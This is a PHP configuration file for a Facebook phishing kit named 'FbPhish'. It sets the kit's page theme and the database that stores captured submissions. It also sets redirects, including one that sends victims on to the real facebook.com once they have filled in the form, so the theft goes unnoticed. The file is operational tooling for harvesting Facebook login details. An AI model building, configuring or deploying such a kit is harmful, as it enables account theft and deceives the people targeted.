<?php
// This is the configuration of the FB phishing tool!
// Here you should define all database connection settings and other stuff
// ALL OPTIONS, EXCEPT DATABASE SETTINGS AND MESSAGES SHOULD BE SET WITH LOWERCASE LETTERS AND/OR NUMBERS


// FbPhish settings

// FBPhish theme
// You can create new themes by adding them to the 'themes' folder
$theme = "nl_NL";

// If poeple come on action.php but did not submitted a form:
// HOME: Redirect to index.php
// FACEBOOK: Redirect to facebook.com
// NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
$config_option__287 = "home";

//Config option 301:
// If a form was completely filled in redirect to:
// HOME: Redirect to index.php
// FACEBOOK: Redirect to facebook.com
// NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
$config_option__301 = "facebook";

//Config option 302:
// If a form was NOT completely filled in redirect to:
// HOME: Redirect to index.php
// FACEBOOK: Redirect to facebook.com
// NOT HOME OR FACEBOOK: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
$config_option__302 = "home";

// Config option 451:
// If the system encounters an SQL/PDO error:
// HOME: Redirect to index.php
// FACEBOOK: Redirect to facebook.com
// SHOW: Show the SQL/PDO error
// NOT HOME, FACEBOOK OR SHOW: Then redirect to the entered link (example: if you enter google.com in the var it will redirect to goole)
$config_option__451 = "sho";


// Database settings
$fbphish_sql_host = "localhost";
$fbphish_sql_user = "root";
$fbphish_sql_password = "";
$fbphish_sql_db = "fbphish";



